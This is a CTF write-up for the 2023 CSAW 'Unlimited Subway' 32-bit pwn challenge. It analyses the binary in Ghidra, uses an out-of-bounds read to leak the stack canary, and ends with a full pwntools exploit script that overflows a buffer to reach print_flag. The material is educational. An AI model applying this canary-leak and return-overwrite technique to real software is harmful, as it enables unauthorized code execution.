---
title: Unlimited Subway csaw quater 2023
author: megachar0x01
date: 2023-09-18
categories: [Pwn, i386, ctf]
---


## Initial Assessment

Upon initial examination of the binary, the following properties and security measures were identified:

- **Architecture**: The binary is compiled for the i386 architecture, indicating that it is intended for 32-bit Intel x86 systems.
    
- **Canary and Non-executable Stack Mitigation**: The binary has enabled security measures, including the use of a "canary" and a non-executable stack. The canary is a random value placed on the stack before local variables, which helps detect stack overflows. Additionally, marking the stack as non-executable prevents the execution of code from that memory region, enhancing security.
    
- **PIE (Position-Independent Executable) Mitigation**: PIE mitigation is disabled in this binary. Consequently, the binary's base address is not affected by Address Space Layout Randomization (ASLR). This lack of ASLR protection may have implications for the binary's exploitability.

<img src="https://i.imgur.com/8cz1wNp.png" alt="img_1">

## Detailed Analysis

Opening binary in Ghidra .

Here's a breakdown of what the Main function is doing:

1. It initializes several local variables, including a bunch of `undefined4` variables (which are essentially 4-byte integers) and a few other variables of different types.

2. It enters a loop using a `while (true)` construct. Inside this loop, it performs the following actions:

   - It calls a function named `print_menu`. Which print the menu.
   
   - It reads two bytes from the standard input into the variable `local_8a`.
   
   - It checks if the character represented by `local_8a` is equal to 'F'. If true, it prompts the user for some data and reads it into `local_88`.

   - If `local_8a` is not equal to 'F', it proceeds to the next `while` loop.
   
   - Inside the next `while` loop, it checks if `local_8a` is equal to 'V'. If true, it prompts the user for an index, reads it into `local_94`, and then calls a function named `view_account` with the address of `local_88` and `local_94` as arguments. This will Read value from memmory.

   - If `local_8a` is not equal to 'V', it proceeds to the next `while` loop.
   
   - Inside the third `while` loop, it checks if `local_8a` is equal to 'E'. If true, it breaks out of the loop and proceeds to the next section of code.

   - If `local_8a` is not equal to 'E', it prints "Invalid choice".

3. After exiting the loop, it prompts the user for the size of a name and reads it into `local_90`.

4. It then prompts the user for a name and reads it into `local_48`.

5. There is a conditional check `if (local_8 != *(int *)(in_GS_OFFSET + 0x14))` which appears to be a stack protection check. If this check fails, it calls `__stack_chk_fail()` which typically triggers a stack smashing error.

6. Finally, the function returns 0.

<img src="https://i.imgur.com/nbI87za.png" alt="img_1">


This is a C function named `print_flag` that does the following:

1. It calls the `system` function with the command `"cat ./flag"`. The `system` function is used to execute shell commands. In this case, it's running the `cat` command to display the contents of a file named `flag`.

2. After executing the command, the function returns.

<img src="https://i.imgur.com/IR5IOAC.png" alt="img_1">


## Vulnerability Assessment

<img src="https://i.imgur.com/EMagNxi.png" alt="img_1">

This enables us to perform an out-of-bounds read, thereby allowing us to extract the canary value.

<img src="https://i.imgur.com/dojWfU8.png" alt="img_1">


By manipulating the number of bytes read in the buffer, we induce a buffer overflow, granting us the ability to redirect code execution towards the 'print_flag' function.
## Flag

<img src="https://i.imgur.com/GmbU86V.png" alt="img_1">


## Exploit Script 

```python
#!/usr/bin/python3

from pwn import *
import struct

# context.terminal = ['tmux','splitw','-h']
os.environ['XDG_CACHE_HOME'] = '/tmp/'

context.log_level = 'error'

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''

continue
'''.format(**locals())

exe = './bin'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)
libc = elf.libc ; libc_rop = ROP(libc,checksec=False)

io = start()

canary = b"0x"

for i in range(131,127,-1):	
	io.sendlineafter(b">",b"V")
	io.sendlineafter(b"Index : ", str(i))
	
	canary+=io.recvline().split(b": ")[1].strip(b"\n")
	
for i in range(12):
	#sleep(1)
	print("Leaking Canary "+"."*i)

canary_int=(int(canary,16))

print(f"Leaked Canary : {hex(canary_int)}")

io.sendlineafter(b">",b"E")

io.sendlineafter(b"Name Size : ",b"500")

payload = b""
payload += b"A"*0x40
payload += p32(canary_int)
payload += b"aaaa" #EBP
payload += p32(elf.sym.print_flag)

io.sendlineafter(b"Name : ",payload)


io.interactive()
```
